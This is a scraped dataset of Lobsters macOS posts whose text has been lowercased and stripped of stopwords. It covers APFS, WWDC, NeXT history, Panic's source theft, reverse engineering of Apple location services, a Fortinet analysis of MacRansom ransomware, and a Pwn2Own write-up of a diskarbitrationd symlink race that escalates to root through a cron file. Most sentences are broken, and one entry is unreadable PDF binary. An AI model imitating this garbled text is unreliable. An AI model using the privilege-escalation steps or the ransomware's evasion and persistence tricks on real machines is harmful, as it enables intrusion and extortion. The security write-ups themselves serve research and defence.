disk utility retain ability format work hf drive clear may begin adding feature work best work specifically apfs already appears io release installed io update may noticed filesystem conversion meant took quite bit longer complete regular io update going true macos conversion apple specific time estimate give end going vary widely based size type speed disk speed mac much data stored drilled esoteric technical aspect apfs piece least apfs current sierra beta form want focus apfs actually letting apple macos one obvious benefit one apple showed stage keynote ability copy file disk without actually physically storing two different copy disk native support solidstate drive encryption harder quantify nevertheless important given increasing prevalence apple stressed particular much flexible apfs current technology come time implement future tech let take fusion drive good example feature announced solve new problem ssds fast small expensive hdds large cheap really slow combining two get best world totally made sense still desktop despite increased capacity lower cost ssds hf idea fusion drive distinguish ssd spinning hdd even aware fusion drive actually two disk presented operating system single volume apple relies underlying technology called core storage heavy lifting core storage combine drive present o filesystem single disk core storage responsible shunting data ssd depending apps file accessing core storage limitation filesystem actually aware core storage see block block contains essential system file look block contains say application spreadsheet fusion drive keep track often block accessed move frequently accessed block ssd keeping infrequently used block spinning disk apfs avoid like hf aware file capable telling difference like core storage also handle combining drive moving data around background going make fusion drive lot smarter high sierra currently instance apfs tell difference different type file frequently accessing something take lot space really benefit extra storage video file decide move file ssd freeing space thing reducing amount wear drive apfs also keep file metadata ssd keeping file spinning disk speeding spotlight search quick trip get info window apfs also benefit local time machine snapshot something normally take quite bit space apfs support snapshot time machine longer save multiple full copy file keep track specific change editing powerpoint presentation instance changing individual slide hf mean saving two copy file one record new change one case want revert save original file plus record difference original file updated version accomplishing task substantially le space fusion drive improvement taking le space ssds particular mean writing le data drive ultimately mean drive going last longer apple say change extended normal time machine backup mostly number variable filesystem target drive file sharing protocol used backup networked storage apfs least open door efficient granular time machine backup point future everything apfs pretty good illustration apple planning use modernize core mac technology behind scene people tell filesystem computer using even aware filesystems first place mean see benefit change like
413,Lobsters,mac,Apple macOS,MacRansom: Offered as Ransomware as a Service,https://blog.fortinet.com/2017/06/09/macransom-offered-as-ransomware-as-a-service,macransom offered ransomware service,netmarketshare macransom portal behavioral analysis antianalysis launch point encryption conclusion fortiguard lion team,many mac o user might assume computer exempt thing like ransomware attack think system somehow essentially secure true le likely mac o user attacked infected malware window user nothing level vulnerability operating system largely caused fact personal computer run microsoft window around apple mac o figure market share desktop o reference netmarketshare macransom portal recently fortiguard lab discovered ransomwareasaservice raas us web portal hosted tor network become trend nowadays however case rather interesting see cybercriminals attack operating system window could first time see raas target mac o figure tor portal macransom macransom variant readily available portal necessary contact author directly build ransomware first thought scam since sample verify dropped author email unexpectedly received response figure u first email inquiring ransomware stated requirement outlined author bitcoin amount target pay date trigger ransomware executable someone plug usb drive sent email around received first response around day response agreeing june trigger date giving bitcoin address author gladly sent sample response since author replied quite promptly u tried dig deeper asking ransomware response observing time response gave u hint author might different time zone since reply came back late night could morning also first response author said june midnight local time may noticed time difference emailed verify geolocation malware author ransomware took look original stmp header found time zone gmt figure smtp header behavioral analysis next began examine malware feature author claimed ransomware take look code see conformed feature figure macransom feature running macransom sample prompt showed stating program unidentified developer long user open suspicious file unknown developer safe clicking open give permission ransomware run antianalysis first thing ransomware check sample run nonmac environment debugged condition met ransomware terminates call ptrace process trace command argument ptdenyattach check see ransomware attached debugger figure ptrace command second using sysctl hwmodel command check machine model compare mac string figure model check lastly check machine two cpu figure check logical cpu launch point passed initial check ransomware creates launch point librarylaunchagentscomapplefinderplist filename intentionally imitates legitimate file mac o lessen suspicion malicious activity launch point allows macransom run every start ensure encrypts specified trigger time content comapplefinder original executable copied libraryfsstore filename similar legitimate file file copied time date stamp changed using command touch ct manipulation time date stamp commonly used confuse investigator come digital forensics ransomware us launchctl load created comapplefinderplist encryption mentioned encryption trigger time set author case june ransomware terminates date figure trigger time check trigger time met ransomware start enumerate targeted file using command shown unusual way ransomware enumerate file still effective since ransomware traverse directory includes list targeted extension encrypt file path ransomware figure file enumeration ransomware encrypts maximum file returned command stated cryptoransomware encryption algorithm core component spent analysis time goal find rsacrypto routine however piece cryptoransomware sophisticated osx cryptoransomware previously disclosed us symmetric encryption hardcoded key hijack victim file two set symmetric key used ransomware readmekey targetfilekey readmekey used decrypt readme file contains ransom note instruction targetfilekey used encrypt decrypt victim file remarkable thing observed reverseengineering encryptiondecryption algorithm targetfilekey permuted random generated number word encrypted file longer decrypted malware terminated targetfilekey freed program memory hence becomes challenging create decryptor recovery tool restore encrypted file moreover function communicate c c server targetfilekey meaning readily available copy key decrypt file however still technically possible recover targetfilekey one known technique use bruteforce attack take long modern cpu bruteforce long key key used encrypt known file predictable file content nevertheless still skeptical author claim able decrypt hijacked file even assuming victim sent author unknown random file shown figure ransom note entirely true pseudo code encryption process follows figure encryption routine successfully encrypting targeted file encrypts comapplefinderplist original executable change time date stamp deletes done author even recovery tool used get ransomware artifact file next meaningless ransomware demand bitcoin around usd requires victim contact getwindows protonmailcom decryption figure ransom note conclusion every day see new ransomware specifically targeting mac o platform even far inferior current ransomware targeting window fail encrypt victim file prevent access important file thereby causing real damage last least macransom variant potentially brewed copycat saw quite lot similar code idea taken previous osx ransomware even though utilizes antianalysis trick differs previous osx ransomware wellknown technique widely deployed many malware author macransom yet another example prevalence ransomware threat regardless o platform run perfect mitigation ransomware however impact minimized regular backup important file cautious opening file unidentified source developer fortiguard lion team appendix sample zip detected osxmacransoma tr macho file dropped file launchagentcomapplefinderplist libraryfsstore faq macransom portal sign weekly fortinet fortiguard lab threat intelligence brief stay top newest emerging threat
414,Lobsters,mac,Apple macOS,New C++ library makes it easy to plot cool 2D looking charts,https://github.com/madplotlib/madplotlib,new c library make easy plot cool looking chart,madplotlib matplotlib matplotlib eigen screenshots installation qt eigen madplotlibh testing eigentestscpp matplotlib contribute githubforking contact twitter stackoverflow library feature,madplotlib c wrapper qt chart look taste smell like matplotlib nt madplotlib c headeronly library provides simple plot capability similar matplotlib python madplotlib us qt chart behind back render cool looking cat graph easy create help eigen look like eigen arrayxf eigen arrayxf linspaced eigen arrayxf b eigen arrayxf linspaced eigen arrayxf c eigen arrayxf zero b b b c madplotlib plt plttitle test linear v exponential v flat pltylabel value pltxlabel x value pltplot qstring labellinear pltplot b qstring labelexponential pltplot c qstring labelflat pltlegend loccenter right pltshow screenshots installation make sure use qt higher eigen properly installed add madplotlibh project nt worry anything else got back jack testing companion cube file eigentestscpp demonstrates several feature offered library test case heavily commentted make sure know great reference get quickly started way mention resembles matplotlib contribute ginormous number thing would like incorporate library including damn good documentation strong force would like contribute project recommend handson guide githubforking learn technical shenanigan remember doubt clone fork contact twitter stackoverflow library feature data plotting must created eigen arrayxf draw line scatter plot simultaneously time line continuous made dash even dot circular squared marker used scatter plot support multiple series data title label legend specified color support line marker persistence save chart disk pngjpg define limit axis showhide axis tick background grid chart block execution flow show mimic plot matplotlib disabled
415,Lobsters,mac,Apple macOS,Macintosh Human Interface Guidelines (1992),http://interface.free.fr/Archives/Apple_HIGuidelines.pdf,macintosh human interface guideline,,obj calrgb whitepoint gamma matrix endobj obj length filter lzwdecode stream b f l z w gu wjax h endstream endobj obj procset pdf text colorspace font r r r r r endobj obj name type font subtype fontbbox fontmatrix firstchar lastchar encoding r charprocs r width endobj obj type encoding difference endobj obj space r k r endobj obj length filter lzwdecode stream endobj obj length filter lzwdecode stream endobj obj length filter lzwdecode stream hch ӽ sx kјf u h h ᵦ k c b lwư n p bh c cd db cxt b b r p endstream endobj obj procset pdf text colorspace font r r r r r r endobj obj length filter lzwdecode stream hch ҡ ki ci q c ei gm f c io ky zkp endstream endobj obj procset pdf text colorspace font r r r r r endobj obj length filter lzwdecode stream ҡ ѝx ϗs hc ue c z ajd endstream endobj obj procset pdf text colorspace font r r r endobj obj length filter lzwdecode stream hch u jr qx h p yb k endstream endobj obj procset pdf text colorspace font r r r endobj obj length filter lzwdecode stream l uzg p
417,Lobsters,mac,Apple macOS,Safari sandbox – Mount yourself a root shell,https://phoenhex.re/2017-06-09/pwn2own-diskarbitrationd-privesc,safari sandbox mount root shell,disk arbitration ipc interface bug discovery code execution safari renderer disk arbitration apple web site sip building local admin root exploit cron daemon towards sandbox escape authorization token triggering bug safari access ipc endpoint diskarbitrationd check write access arbitrary directory check ability obtain authorization token mounting nope ability create symlinks nope,today race condition macos system service could used escalate privilege local admin root used combination logic bug escape safari sandbox competition bug disk arbitration daemon responsible managing block device macos ipc interface accessed inside safari sandbox made interesting target u exploiting bug could mount disk partition nonsip protected directory since small recovery partition every recent macbook default user allowed write allowed u put file arbitrary content file system gain root privilege bug discovery achieving code execution safari renderer goal laterally move privileged system process started audit looking list allowed mach lookup ie service talk via mach ipc list found sandbox rule file systemlibraryframeworkswebkitframeworkversionsaresourcescomapplewebprocesssb start follows allow machlookup globalname comapplediskarbitrationdiskarbitrationd globalname comapplefilecoordination globalname comapplefontobjectsserver first one list immediately caught attention disk arbitration apple framework responsible managing primarily mounting unmounting block device diskarbitrationd service handling corresponding ipc request would browser renderer ever need mount disk definitely warranted investigation p aux grep diskarbitrationd grep v grep root s usrlibexecdiskarbitrationd sudo launchctl procinfo pgrep diskarbitrationd grep sandboxed sandboxed expected diskarbitrationd run root order use mount syscall sandboxed also verified could reach sandbox writing small client script swift running comapplewebprocesssb sandbox file using sandboxexec tool considered looked like diskarbitrationd could interesting target exploitation started auditing old version server source code downloaded apple web site looking memory corruption bug first soon came across following code darequestc line determine whether mount point accessible user dadiskgetdescription disk kdadiskdescriptionvolumepathkey null darequestgetuseruid request cftyperef mountpoint mountpoint request mountpoint char path path cfurlcopyfilesystemrepresentation mountpoint path struct stat st stat path st ststuid darequestgetuseruid request status kdareturnnotpermitted mechanism implemented supposed prevent user mount privilege mount directory etc system work follows mount point exists owned user error code kdareturnnotpermitted produced otherwise mount proceeds check mount succeed intended mount point exists diskarbitrationd sufficient permission perform mount case directory protected system integrity protection sip security mechanism old school time check v time use issue mount point created check mount mount succeed even caller mount point attacker bypass check creating symlink pointing arbitrary directory check mount apple patched bug macos sierra released source code yet update post new source code becomes available outline patch building local admin root exploit example use bug mount disk etc using following pseudocode disk devsomediskdevice background true create symlink tmpfoo pointing remove symlink disk mounted etc send ipc request diskarbitrationd mount disk tmpfooetc eventually check executed symlink gone mount happen symlink present pas point mounted etc possible local admin user without least typing password privilege escalation standpoint two problem remain disk device usually unmounted writable local admin user directory want mount give u code execution root problem easily solved looking physical device l alih devdisk brwr root operator mar brwr root operator mar brwr root operator mar brwr root operator mar brwr root operator mar one work purpose efi partition volume used bios update macbooks know usually mounted since contains fat file system support unix permission mount local admin user write might also possible create block device disk image using hdiutil use exploit yet able get race condition work setting problem took figure eventually realized legacy cron daemon still exists modern macos operating system running default crontab file get created varattabs launchd start cron daemon work expected suffices mount disk device varattabs write payload varattabsroot touch tmppwned command get executed every minute root point fully working way going local admin root without typing password poc code found file pocmountsh give root shell clang installed pocmountsh imagine root shell gon na legen wait dary pocmountsh line killed racelink id root wheel wheel daemon kmem sys tty operator procview procmod everyone staff certusers localaccounts admin appstore lpadmin lpoperator developer comappleaccessftp comappleaccessscreensharing comappleaccessssh exploit comparable uac bypass window turned useful combined bug towards sandbox escape use disk arbitration apis need first provide authorization token issuing mount request diskarbitrationd try obtain right systemvolume mount using token depends type volume want mount example request mount internal disk partition diskarbitrationd use following logic check authorization inside daauthorize function dasupportc dareturn status status kdareturnnotprivileged authorizationref authorization authorization dasessiongetauthorization session authorization authorizationflags flag authorizationitem item char name authorizationrights right flag kauthorizationflagextendrights dadiskgetdescription disk kdadiskdescriptiondeviceinternalkey kcfbooleantrue asprintf name systemvolumeinternal right name itemflags itemname name itemvalue null itemvaluelength rightscount rightsitems item status authorizationcopyrights authorization right null flag null status status kdareturnnotprivileged free name authorization token associated session fetched provided via ipc call advance string systemvolumeinternalmount produced checked whether token used obtain right via authorizationcopyrights api api implemented comappleauthd service triggering bug safari see need trigger bug already inside sandbox access ipc endpoint diskarbitrationd check write access arbitrary directory check suffices able write one specific directory need write root file mounted disk mount disk directory first umount use bug mount varattabs positive stringlength param darwinusercachedir allow file subpath param darwinusercachedir sandbox rule webprocesssb give u full write access privatevarfolders somerandomstring ccomapplewebkitwebcontentcomapplesafari subdirectory ability obtain authorization token mounting nope local admin user obtain right order mount volume mechanism place prevents sandboxed process creating authorization token right sandbox rule explicitly allow webprocesssb contains rule form allow authorizationrightobtain obtain right ability create symlinks nope safari sandbox explicitly disallows creating symlinks defined vnodetype deny filewritecreate vnodetype symlink next part series present three bug one used create symlinks two bypass sandbox check authorization logic
418,Lobsters,mac,Apple macOS,Looking Back at WWDC 97,http://bslabs.net/2017/06/01/wwdc-1997/,looking back wwdc,wwdc mac o trip report john norstad disinfectant wwdc first step regaining trust appletechlabjp aldusadobe persuasion pointing update wwdc video series mac o series rhapsody series interactive medium series internet web series hardware additional link,eve wwdc starting new series post looking back past wwdcs aim make original slidesvideos publicly available sake preservation add historical context find interesting tidbit undelivered promise unrealized possibility presenter would later rise rank etc first wwdc may apple held worldwide developer conference san jose ca five month purchase next apple demoed rhapsody new nextbased operating system would eventually replace classic mac o apple would also continue develop classic mac o including release mac o summer think fascinating examine transition point history context change transpired next year gil amelio fired july steve job replaced ceo september following month job ended clone program killed newton underperforming product introduced power macpowerbook rhapsody strategy would also overhauled shown wwdc rhapsody would require mac application largely rewritten yellow box later renamed cocoa apis order take full advantage protected memory preemptive multitasking modern feature mac developer particularly large one including adobe microsoft excited wwdc apple introduced mac o x based rhapsody including much cleaner migration path carbon apis existing mac apps although mac o x shipped almost year late transition sluggish history proven mac o x derivative os including io massive success research post came across wwdc trip report written noted mac developer john norstad disinfectant newswatcher fame interesting read like nearly mac developer time norstad bitter skeptical seeing continual engineering failure preceding year seeing rhapsody strategy engineering management change led steve job norstad leaf conference cautiously optimistic future norstad state mac developer felt many time promise went wwdc first step regaining trust cd thanks appletechlabjp presentation come wwdc presentation cd originally saved ppf file aldusadobe persuasion presentation file hat tip steve troughtonsmith pointing animated gifs used preview export pdfs adobe acrobat optimize recompressing image zip since slide image note italic update found cd set containing session video posted wwdc video series mac o series rhapsody series interactive medium series internet web series hardware additional link
419,Lobsters,mac,Apple macOS,WWDC June 2017,https://www.apple.com/apple-events/june-2017/,wwdc june,apple special event,apple special event june announcing upgraded operating system iphone ipad mac apple watch apple tv
420,Lobsters,mac,Apple macOS,The Unofficial WWDC app for macOS,https://wwdc.io,unofficial wwdc app macos,watch wwdc video year previous year live download chromecast pictureinpicture search filter new version favourite wwdc apple developer related project io app press,watch wwdc video year previous year watch session live download video later watch chromecast pictureinpicture mode search filter event track platform new version transcript provided apple universal link handoff share clip new community tab curated content cocoahub system requirement macos catalina later favourite wwdc apple developer related project apple official developer app io see schedule map video news excellent source article newsletter podcasts development apple platform collection wwdc scholarship winner io app also available searchable fulltext transcript wwdc session follow swift evolution proposal io device wwdc macos native app electron macos trademark apple inc registered u country app made affiliated endorsed apple press
421,Lobsters,mac,Apple macOS,NeXT: Steve Jobs’ dot.com IPO that Never Happened,http://www.computerhistory.org/atchm/next-steve-jobs-dot-com-ipo-that-never-happened/,next steve job dotcom ipo never happened,november sec statement,february today anniversary formal completion apple computer acquisition next software inc steve job first company bought second history likely would different apple might exist today iphone could happened next former next software leader thenapple senior vp software avie tevanian donated computer history museum historic document hint alternate history draft november sec statement never completed submitted declaring next planning issue initial public offering million share common stock steve job next staff retreat sonoma california photograph doug menuez next software inc sec form chm next computer cube photographed mark richards chm steve job veteran macintosh lisa team founded next job resigned apple ousted chairman boardroom coup initially integrated hardware software company next computer technologically advanced market failure likely connected high price nevertheless operating system nextstep based unix mach kernel developed avie tevanian others carnegie mellon became widely admired nextstep objectoriented software development environment enabled developer write application easily crudely put objectoriented software fundamentally modular application quickly made reusing extending preassembled module object library fourth quarter next ported intel processor discontinued hardware line pivoting company toward software selling nextstep enterprise large organization including wireless merrill lynch u postal service fannie mae u navy according next continued financial loss making positive net income million three consecutive year loss ranging million million much related closure workstation business next realized rather competing sun hp microsoft enterprise platform vendor would better porting software platform nextstep would become available four processor architecture next motorolabased computer sun sparc hp parisc intelbased machine addition next separated objectoriented development environment mach underpinnings porting called openstep environment run microsoft window nt sun hp version unix o even licensing source code sun turn earlier proprietary verticallyintegrated strategy embracing wide crossplatform availability collaboration former competitor company changed name next computer inc next software inc reflect new focus nextstep intel processor chm openstep mach intel processor floppy disk chm alone however sufficient warrant ipo ipo netscape ignited dot com boom wake netscape job guided successful ipo company pixar success toy story next jumping world wide web probably seemed web invented next computer sir tim bernerslee next already sophisticated enterprise software technology enterprise object framework eof enabled developer write desktop application connected serverbased database building openstep eof next created webobjects objectoriented development environment website could serve dynamic web content onthefly rather static page dominant time p webobjects separated web application business logic user interface underlying data source allowing greater flexibility change well high compatibility legacy system mainframe pp webobjects one first application server web first time ever allowed customer build dynamic website released march webobjects targeted growth opportunity open internetweb well corporate intranet would help diversify next customer away large institution currently depended end next would allow programmer write webobjects application using sun objectoriented java language p le year webobjects gained significant client notably dell used create four week online store provided uptothe minute pricing configuration information online ordering capability p apple would later use webobjects online store including itunes music store next finally turning revenue next two newest product webobjects openstep window already brought million next total software revenue first nine month p enterprise object framework cdrom multiplatform intel sparc parisc next computer motorola processor chm webobjects developer cdrom chm previously undisclosed sec filing donated museum avie tevanian clearly show next anticipated webobjects would generate enough growth justify ipo especially postnetscape investment environment despite next accumulated loss million p dot com boom generally ignored current profitability completely focused exclusively growth potential next planned offer million share estimated price share raising estimated million turning next dot com steve majority retire firm debt repay major shareholder including canon corporation h ross perot u presidential candidate although next business evenly split existing openstep business webobjects job next executive believed webobjects business would grow much faster steadily growing openstep business eventually become majority sale none ever happened job preparing next ipo developing disclosure first company apple sinking macintosh operating system showing age especially compared microsoft window apple replacement operating system copland became complex unmanageable apple ceo gil amelio forced cancel apple began look new o outside company even considered licensing window nt kernel o search apple next began discussion november apple also negotiation another company founded exapple executive jeanlouis gassée also tried make hardware pivoted software competitive comparison beos next bakeoff acquired next outright million cash million apple share apple nextstepopenstep operating system webobjects web strategy mac o x code named cheetah next vp engineering avie tevanian became apple senior vp software former next vp hardware jonathan rubinstein became apple senior vp hardware course apple also got back cofounder steve job though initially advisor firmly charge august tevanian leadership nextstep became basis mac o x released march o x turn became basis operating system iphone unveiled job year ago january apple acquisition next next ipo never happened never became dot com might happened webobjects highly admired time release fact powered dell original online store webobjects significantly flexible advanced many competing technology purchase apple webobjects gradually languished discontinued would independent postipo next dominated web application market webobjects could ridden burst dot com bubble never know
422,Lobsters,mac,Apple macOS,Vanilla: Hide MacOS Status Bar Icons,http://matthewpalmer.net/vanilla/,vanilla hide macos status bar icon,vanilla pro rocket,apple seen fit build function mystery surpassing human understanding one rare third party utility simple yet useful wonder included feature macos hard beat looking hide menu bar icon check vanilla incredible apple nt released tool like yet vanilla pro vanilla never nag upgrade like unlock pro version reach peak mac minimalism perfect menu bar completely hiding icon hide app icon mac menu bar compatible light dark menu bar automatically hide icon five second start vanilla automatically log toggle icon keyboard shortcut seriously use commandshift like forty time day get pro vanilla create beautiful minimalist mac setup also make rocket mac emoji app featured verge lifehacker
423,Lobsters,mac,Apple macOS,The Case of the Stolen Source Code,https://panic.com/blog/stolen-source-code/,case stolen source code,macos video transcoding app handbrake compromised somebody somewhere quite bit source code several apps indication customer information obtained attacker furthermore indication panic sync data accessed finally web server compromised read story someone bunch source code really matter build free cracked version apps create malwareinfected build apps competitor obtains source attempt use advantage way every day pass stolen source code outofdate assistance importantly right people apple standing quickly shut stolenmalwareinfested version apps may discover together could also use help see cracked otherwise unofficial version apps wild safest assume infected ask please let u know see source show somewhere also let u know information could help investigation incident definitely let u know email u dm u twitter,last week three day macos video transcoding app handbrake compromised one two download server handbrake serving special malwareinfested version app launched would essentially give hacker remote control computer case extraordinarily bad luck even guy lot bad computer luck happened download handbrake three day window work mac got pwned long story short somebody somewhere quite bit source code several apps continue three important point indication customer information obtained attacker furthermore indication panic sync data accessed finally web server compromised reminder never store credit card number since process stripe panic sync data encrypted way even see read important fact feel like monumental idiot fallen happen story handbrake nagging time install update finally decided whatever reason update note handbrake update dialog incremental update available download entirely fresh copy server think much similar situation broken sparkle update channel worst managed download within three day window infection unknown managed hit one download mirror compromised managed run breeze right inretrospectsketchy authentication dialog without stopping wonder handbrake would need admin privilege would suddenly need also likely bypassed gatekeeper warning without even thinking run handful apps still signed developer mac completely entirely compromised second le time news broke handbrake infection git credential already stolen mac used clone several source code repository according log soon discovered infection mac disabled took mac commission began incredibly lengthy process changing password rotating relevant secret key throughout infrastructure relock door hopefully prevent anything else stolen vast majority thing changed rolled simply abundance caution indication web server compromised kind situation change lock forensics began combing log try determine extent accessed reiterate believe limited source code personal data mac thanks good logging thank james got complete picture method attacker used prevented cloning source code making educated guess repo name onebyone expose everything source code theft confirmed received email attacker source code file attached proof theft demanding large bitcoin ransom prevent release source code would suffocate company word working assumption point paying attacker reason keep end bargain brings u today dust settled sat company allhands meeting conclusion little different originally expected someone bunch source code really matter essentially three worst case scenario considered source somebody hand build free cracked version apps guess already exist already pirate software want pirate software please really change anything regard also whatever free version apps would come person virtually guaranteed infected malware create malwareinfected build apps seems likely given person entire mo infect wellused mac app malware seems inevitable find working directly apple shut minimize risk never download copy one apps source u mac app store going hypervigilant authenticity downloads server competitor obtains source attempt use advantage way many mac developer met year fine upstanding people imagine unethical even willing take risk u finding fingerprint code let forget guessed good chance stolen source could malware slipped also one important thought gave u comfort every day pass stolen source code outofdate hack slowed u source already missing ton fix improvement committed last week alone six month missing major critical new feature short old getting older point discussion even halfseriously considered releasing source code idea floated realized fallout lot code question truly felt free assistance within hour hack phone two important team apple fbi apple rallied right security people quickly learn could situation course already blocked handbrakeattached malware broader mac population discovered widely walked u best way roll developer id invalidate old one think leaked overly cautious importantly right people apple standing quickly shut stolenmalwareinfested version apps may discover fbi actively investigating say anything together working overtime foreseeable future keep eye situation could also use help see cracked otherwise unofficial version apps wild safest assume infected ask please let u know see source show somewhere also let u know information could help investigation incident definitely let u know know use every method available u legal technical name fix feel free email u dm u twitter anytime even question reminder never download one apps source website mac app store hard post write hate happened kick every day paying attention tell obvious hindsight good reminder though matter experienced might computer human mistake easily made even though affect customer directly want apologize even discussion year keep u going every day buying software giving u good idea telling friend u good world going everything rise keep going even together
424,Lobsters,mac,Apple macOS,Switching to OpenBSD,http://mndrix.blogspot.com/2017/05/switching-to-openbsd.html,switching openbsd,enjoying apple simplicity availability function,short story year switched macos openbsd clean focused stable consistent let get work done without hassle long story first became interested computer thought operating system fascinating year would reinstall operating system every weekend try different configuration msdos window linux countless hour recompiling kernel high school settled ran year graduated college switched linux college used exclusively year got tired configuring linux switched o x next year thing worked pretty happy o x gave unix mostly got way could write software wrote enjoying apple simplicity snow leopard even spent entire release cycle fixing bug improving performance snow leopard year ago day o x like running denial service attack macos dozen apps nt use ca nt remove updating requires restart frequent update browser require restart minor xcode update requires download gb file monitor frequently turn require restart fix system availability function mean time failure mean time repair macos number heading wrong direction nt hold hard feeling time get o back productive work go chromebooks great availability update infrequent small fast nearly transparent unfortunately need o write compile code also want run older commodity hardware replace broken laptop instead considered several linux distribution lubuntu seemed promising bloated taste couple year ago tried ubuntu dell xps developer edition month even hardware designed linux fragile desktop linux also become even complex used decade ago want get work done feed maintain o reminded openbsd heartbleed scare everyone else complaining openssl claiming open source failed openbsd developer quietly drew machete hacked hundred thousand line bad code forking libressl keep clean stable openbsd community like focus really important hold code high standard ignore distraction trying live past trying make future place worth living anyway found openbsd refreshing created bootable thumb drive within hour running twoyear old laptop using daily work past two week great simple boring productive way like documentation fantastic using unix year learned quite bit reading man page o release come like clockwork every month supported security update seem relatively rare release roughly one small patch per week syspatch installing really easy also enjoy thing turned openbsd default base installation sparse assumes enable service install tool want constantly facing update software never use experience openbsd still young really like see far
425,Lobsters,mac,Apple macOS,Reverse Engineering Apple Location Services Protocol,https://appelsiini.net/2017/reverse-engineering-location-services/,reverse engineering apple location service protocol,reverse engineering apple location service protocol whereami little snitch charles location service request protocol buffer protomowersh guided location service response email protected email protected email protected email protected still result trilateration core location easier way thing additional reading application à l analyse de données de géolocalisation envoyées par un smartphone vulnerability analysis countermeasure wifibased location service application gaussian process signal strengthbased location estimation reddit hacker news posted protocol buffer geolocation,reverse engineering apple location service protocol wed may update added new pdf link end header actually lengthprefix framed byte string working whereami got interested apple location service actually work know handled locationd since little snitch keep blocking usual way inspecting traffic proxychains work since macos something called system integrity protection sip alternative way setup charles mitm proxy io device looking traffic mostly device phoning home got needed location service request location service request request applicationxwwwformurlencode binary data post cllswloc host gslocapplecom contenttype applicationxwwwformurlencoded contentlength proxyconnection keepalive accept useragent acceptlanguage enus acceptencoding gzip deflate connection keepalive enus coma pplelocationd since data gzip header second guess protocol buffer rage cool guy using let try decode xxd r requesthex protoc decoderaw failed parse input work maybe something extra request logic say mac address part data let try decode blue part hex dump enus coma pplelocationd xxd r protoc decoderaw failed parse input nope top part look like header let try remove header instead enus coma pplelocationd xxd r protoc decoderaw failed parse input still go trial erroring decided brute force removing byte one one beginning see decodes bit polished version script binbash try decode hidden protocol buffer message binary size wc c size dd skip protoc decoderaw printf n read p removed byte continue yy n r printf nn reply yy exit fi fi done protomowersh protomowersh requestbin running first three match seemed like false positive output data garbled fourth one feel legit record record byte transferred sec bytessec removed byte continue yy seems like original idea quite close yellow part removed byte blue part successfully decoded protocol buffer message enus coma pplelocationd mean request message four different type data protocol buffer lingo data type called tag message four tag string contains mac address likely wifi router mac address embedded message contains value think struct object integer meaning unknown maybe age since router last seen signal noise ratio prove hypothesis let try make request different mac address used hex editor edit binary request file post request curl enus coma pplelocationd curl http gslocapplecomcllswloc include request post databinary bad request date sun may gmt cneonction close contenttype textplain xrid contentlength bad request go went wrong looking dump see message one byte longer must checksum somewhere one pretty obvious decimal original message byte long new message byte long would hex would also bet variable bit integer ie enus coma pplelocationd curl http gslocapplecomcllswloc include request post databinary ok xrid contenttype textplain contentlength success know format request header dissected furthrer originally though magical ascii control code however reader reddit guided correct direction seem lengthprefix framed byte string still think indicates start header though also look like header null terminated nul soh start header length length locale string byte locale enus length length identifier string byte identifier comapplelocationd length length version string byte version ie io version build nul nul end header nul soh start header nul nul end header sure last four byte mean maybe placeholder second header currently empty location service response response quite large email protected c bc ff ff ff ff bc ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff db de email protected ec ee email protected de c ec email protected cf de let try poor man brute forcing work decoded output approximately line long protomowersh responsebin c removed byte continue yy first one bit confusing ie maximum unsigned bit value probably mean mac address found idea think ie rest result clear mac address latitude pow longitude pow look like location accuracy probably wifi channel puzzled first get result occurred successful result first two mac address sent rest mac address close vicinity one submitted still result guess apple offloads trilateration calculation client instead expensive calculation everyone return bunch access point coordinate least three actually visible client core location use signal level distance three coordinate distance target location calculate target location reasonable accuracy access point location service returned requesting location changi information hundred access point around also reduces need contacting location service server long core location coordinate three visible access point calculate location accurately done even offline long wifi turned could write userland core location support programming language natively although easier way achieve thing interesting would write location service server help creative debugging location enabled apps additional reading application à l analyse de données de géolocalisation envoyées par un smartphone françoisxavier aguessy côme demoustier read french paper proto file example python code helped get started protocol seems changed since paper published though vulnerability analysis countermeasure wifibased location service application jun liang roy feng guang gong good reading general understand wifi based positioning work gaussian process signal strengthbased location estimation brian ferris dirk hahnel dieter fox understand half mathematics however paper give good insight problem indoor wifi positioning discussion reddit hacker news posted protocol buffer geolocation
426,Lobsters,mac,Apple macOS,APFS: A Look Inside the New Apple File System,https://www.backblaze.com/blog/apfs-apple-file-system/,apfs look inside new apple file system,apfs apple make apfs apfs better clone copy file folder apfs affect performance apfs security enterprise backup get apfs computer backup guide,editor note posted article originally august since updated new information apfs apple file system one biggest change coming every new apple device make public debut release io also coming mac fact already available developer apfs change mac iphone ipad store file backing data job think new file system fascinating let take look apfs understand important answer question file system vital component computer electronic device file system tell computer interact data whether picture taken phone microsoft word document invisible file computer need file system account stuff file system may sexiest feature underlying technology important get developer interested apple revealed plan apfs annual worldwide developer conference june apfs thoroughly modernizes way apple device track stored information apfs also add cool feature seen file system apfs first appeared macos sierra early test release developer try first general release io apple migrate everything use future since mac client native app like many apple developer boning apfs mean apfs apple defined p apfs differentiates apple file service afs term used describe older apple file network service apfs designed scale smallest apple device biggest work watchos tvos io macos spanning entire apple product line designed getgo work well modern apple device architecture offer plenty scalability going forward apfs change see file finder main way interact file mac undergo major cosmetic change apfs least none apple told u yet neither io mostly abstract file management underthehood stuff tell computer put work data apple make apfs current file system apple us hf hf introduced back mac still new right thirty year ago hf came later improvement newer mac give idea state art changed since consider first mac came late kb ram four time original mac memory single floppy drive could store computer writing gb ram almost thousand time ram first mac gb storage capacity million time size first mac think next time get message drive full given pace computer technology development bit startling still use anything developed long ago essential important file system computer operation hf cuttingedge time apple made computer floppy disk drive hard drive floppy long gone apple device use solid state storage like builtin flash solid state drive ssds store data differently hard drive floppy apfs better apfs better suit need today tomorrow computer mobile device made solidstate storage flash ssds storage technology work differently spinning drive make sense optimize file system take advantage apple paving way store lot data apfs hf support file id example apfs ups mean today mac keep track billion individual piece information hard drive apfs ups quintillion nine followed zero actually much hexadecimal value even though apfs keep track order magnitude data hf see much faster performance need save duplicate file apfs share data file whenever possible instead duplicating information like hf apfs update metadata link actual stored information clone copy file folder created instantly sit watch gigabyte file duplicated en masse wasting extreme amount space process fact clone take additional space since pointing back original data get much better bang storage buck apfs hf manage speaking space space sharing another new feature apfs space sharing help mac manage free space hard drive efficiently set multiple partition even multiple file system single physical device share space presently jump hoop resizing partition want reuse deallocated space apfs view individual physical device container multiple volume inside apfs affect performance networking crucial almost computer computing device year lot emphasis tuning operating system performance maximum throughput helpful developer like u store data cloud whole story latency amount time telling computer something happens also significant effect performance beachball death ever plagued click button try open something cursor change spinning disk look world like beachball apple lot apfs make beachball go away prioritizing latency amount time ask device something apple found way improve performance wherever possible take crash protection example hf us journaling form crash protection keep track change yet made file 